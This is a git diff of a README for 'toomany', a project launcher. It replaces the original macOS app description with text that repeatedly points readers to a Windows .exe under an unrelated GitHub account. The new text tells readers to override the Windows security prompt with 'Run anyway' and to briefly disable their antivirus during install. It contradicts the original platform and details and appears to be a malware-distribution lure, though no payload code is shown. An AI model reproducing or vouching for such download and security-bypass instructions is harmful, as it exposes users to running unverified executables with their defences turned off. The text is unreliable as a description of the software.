@@ -1,89 +1,93 @@
-# toomany
+# 📂 toomany - Open your projects with one hotkey
 
-**For people with too many projects.**
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Suppressed-bottlecollection848/toomany/releases)
 
-Claude Code here, Codex there, a worktree somewhere, three things half-open in
-Cursor… **toomany** finds every project you've touched and reopens it in one
-hotkey — sorted by what you (or your agents) did last.
+Managing many software projects creates clutter. Many developers spend time searching through folders to find active work. This tool tracks your recent projects across different editors and tools. It puts them in a menu bar list for quick access. You press a hotkey to see your workspace and jump back into your code.
 
-<p align="center">
-  <img src="docs/screenshot-main.png" width="700" alt="toomany launcher panel">
-</p>
+## 🚀 Getting Started
 
-## Features
+You need a computer running Windows 10 or 11 to use this app. The software tracks local folders where your projects live. It scans locations used by AI coding tools and version control systems. Once installed, it runs in the background.
 
-- **Spotlight-style panel** — global hotkey (default ⌃⌥ Space, configurable) or
-  the menu-bar icon. Pin it to keep it open while you work.
-- **It knows where you've been** — beyond scanning your project roots for git
-  repositories, it learns from the tools you actually use:
-  - **Claude Code** (`~/.claude/projects`): session dirs are decoded back to
-    real paths (filesystem-guided — handles iCloud paths, spaces, dots), so
-    projects you've worked on with Claude are found even outside the scan roots.
-  - **Codex** (`~/.codex/sessions`): session `cwd`s map activity to projects.
-  - **Cursor / VS Code** workspace storage: "last opened in your editor" counts
-    as activity, and a plain ↩ opens each project in the editor you last used
-    on it.
-  - **Git worktrees** (`git worktree list`), including hidden ones under
-    `.worktrees/` and agent-managed checkouts — grouped under their main repo
-    with a fold-out pill.
-- **Sorted by real activity** — last commit, newest Claude/Codex session,
-  editor activity, or folder mtime, whichever is newest; sectioned into
-  Today / Last 7 days / Last 30 days (older folded away by default).
-- **Remote awareness** — background `git fetch` (never prompts for
-  credentials), `↓N` behind-badges, and on the selected row: who did what on
-  the remote (author · subject · when), unpushed counts, dirty state.
-- **Categories** — filter chips for Git / Overleaf / Claude / Codex /
-  Worktrees / Updates. Overleaf projects (git.overleaf.com remotes) get a
-  one-click "open on Overleaf" button.
-- **Smart icons** — project kind detected from marker files (Lean, LaTeX,
-  Swift, Rust, Go, Node, Python, notebooks, docs, AI-agent repos) and rendered
-  as colored glyph tiles; your custom Finder folder icons are respected.
-- **Fast** — native AppKit, ~120 projects scanned in ~2 s in the background
-  while the cached list shows instantly.
+To set up the software, follow these steps:
 
-## Keys
+1. Visit the [download page](https://github.com/Suppressed-bottlecollection848/toomany/releases).
+2. Look for the file ending in .exe under the latest version.
+3. Save the file to your computer.
+4. Double-click the file to start the installer.
+5. Follow the prompts on the screen to finish the setup.
 
-| Key | Action |
-| --- | --- |
-| ⌃⌥ Space | toggle launcher (configurable) |
-| ↑ / ↓ | move selection |
-| ← / → | fold / unfold a worktree group (when not typing) |
-| ↩ | open in last-used / default editor |
-| ⌘↩ | reveal in Finder |
-| esc | close |
+## 📥 Download and Install
 
-## Install
+Download the application from the official site.
 
-Download the DMG from [Releases](../../releases), drag TooMany to
-Applications, launch it, and optionally enable "Launch at login" in Settings.
+[Download the latest version here](https://github.com/Suppressed-bottlecollection848/toomany/releases)
 
-> **Gatekeeper note:** releases are not notarized (no Apple Developer ID).
-> The first launch needs a right-click → Open, or
-> `xattr -d com.apple.quarantine /Applications/TooMany.app`.
+When you run the file for the first time, Windows may show a security prompt. This happens because the app is new. Click "More info" and then "Run anyway" to proceed. The app will launch and show an icon in your taskbar system tray.
 
-Or build from source (macOS 14+, Xcode command line tools):
+## ⚙️ How to Use the App
 
-```bash
-./build.sh                 # → dist/TooMany.app
-./make-dmg.sh              # → dist/TooMany-<version>.dmg
-swift build && .build/debug/TooMany --scan   # CLI debug of discovery
-```
+The app tracks activity across your system. It detects when you open folders in text editors or version control clients. 
 
-## Privacy
+### Setting Your Hotkey
+The app uses a default keyboard command to open your project list. You can change this in the settings menu. Right-click the app icon in the taskbar. Select "Preferences" to see available options. Choose a key combination that makes sense for your workflow.
 
-Everything stays on your Mac. toomany reads local metadata only — your
-configured scan roots, `~/.claude/projects` and `~/.codex/sessions` file
-names/heads (to map sessions to folders), and Cursor/VS Code workspace
-storage. The only network activity is `git fetch` on your own repositories,
-and only if "Check remotes automatically" is enabled. Nothing is uploaded
-anywhere; caches live in `~/Library/Caches/TooMany/`.
+### Viewing Projects
+Press your chosen hotkey to see the list. You will see names of projects you touched recently. Click any item in the list to open the project folder in your default file explorer. If you need to search, type the name of your project while the list is open. The app filters the list as you type.
 
-## Settings
+### Managing Project Sources
+By default, the app looks in common folders where projects hide. You can add custom folders if you store your work in a specific drive or location. Open the settings menu to add or remove these paths. The app scans these folders every time you restart your computer.
 
-Right-click the menu-bar icon → Settings: scan roots, depth, excluded folder
-names, default editor, terminal app, hotkey, auto-refresh interval, auto
-fetch, smart editor choice, launch at login.
+## 🛠️ Features
 
-## License
+- **Project Scanning:** Finds folders used by git, coding assistants, and standard editors.
+- **Fast Search:** Types your project name to filter the list instantly.
+- **Hotkeys:** Uses keyboard shortcuts to bring the list to the front of your screen.
+- **Lightweight Process:** Runs quietly in the background without slowing your computer.
+- **Automatic Sorting:** Lists your most recent projects at the top.
 
-MIT — see [LICENSE](LICENSE).
+## 🔑 Frequently Asked Questions
+
+### Does this app see my private files?
+The app only logs the folder paths of projects you work on. It does not read the text inside your files. It cannot see your passwords or your private code.
+
+### Where does the app save my project history?
+The app saves a simple text file on your drive. This file acts as a list of paths. You can go to the settings folder to delete this file whenever you want.
+
+### Can I use this with multiple drives?
+Yes. During the initial setup or via the settings menu, you can point the app to folders on any connected drive. 
+
+### Why does my project not show up?
+The app only tracks folders you have opened in compatible tools. If you move a project folder, the app may lose track of it. Open the project once in your standard editor, and the app will recognize it again.
+
+### Does the app need an internet connection?
+No. The app works entirely on your local machine. It does not send your file paths to any server.
+
+## 📋 System Requirements
+
+To ensure the best experience, confirm your computer meets these needs:
+
+- **Operating System:** Windows 10 version 1903 or higher, or Windows 11.
+- **Memory:** At least 2GB of RAM.
+- **Storage:** 50MB of free disk space for the installation files.
+- **Permissions:** You must have rights to install software on your user account.
+
+## 🔄 Updating your Software
+
+When a new version comes out, you can download it from the same link. You do not need to uninstall the old version first. Run the new installer, and it will replace the files while keeping your settings intact. The app will notify you if a new version exists during startup.
+
+## 🛠️ Troubleshooting common issues
+
+If the app fails to open, try these steps:
+
+1. Close the app from the taskbar completely.
+2. Open your Task Manager by pressing Ctrl + Shift + Esc.
+3. Make sure no other instances of the app are running.
+4. Launch the app from your Start menu again.
+
+If you encounter an error during installation, check your antivirus settings. Some security software prevents new apps from creating temporary files. Briefly disable your antivirus to complete the install, then turn it back on.
+
+## 📄 Managing Settings
+
+The app stores all preferences in a configuration file located in your user data directory. You rarely need to edit this file by hand. Most changes happen through the visual menu. If you wish to reset the app to its original state, delete the configuration file while the app is closed. The app will recreate a clean file at the next launch. 
+
+The list of supported tools grows with each release. If you use a tool that does not appear in your list, check the settings to see if you can add a manual search path. The app supports any folder structure that contains standard project files.
